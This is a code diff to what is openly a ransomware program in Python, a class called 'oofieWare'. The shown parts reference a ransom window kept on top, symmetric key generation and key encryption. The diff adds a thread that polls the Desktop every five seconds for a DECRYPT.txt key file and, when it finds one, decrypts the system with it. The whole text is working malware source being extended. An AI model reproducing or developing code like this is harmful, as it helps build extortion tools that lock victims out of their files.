@@ -6,6 +6,7 @@ import socket
 import base64
 import json
 import requests
+from time import sleep
 from typing import Optional
 from ctypes import wintypes, windll, create_unicode_buffer
 import tkinter as tk
@@ -231,6 +232,19 @@ class oofieWare:
                 if self.ransomWindow:
                     self.ransomWindow.lift()
 
+    def detect_dec_key(self):
+        while True:
+            try:
+                with open(f"{self.Desktop}/DECRYPT.txt", "rb") as dec:
+                    self.key = dec.read()
+                    self.decrypter = Fernet(self.key)
+                    self.crypt_system()
+
+            except Exception as e:
+                pass
+
+            sleep(5)
+
 def attack():
     oof = oofieWare(gen_rsa = True)
     oof.gen_sym_key()
@@ -239,6 +253,8 @@ def attack():
     oof.enc_key()
     elevate = threading.Thread(target = oof.elevate_ransom_window)
     elevate.start()
+    detect = threading.Thread(target = oof.detect_dec_key)
+    detect.start()
     oof.show_ransom_window()
     
 
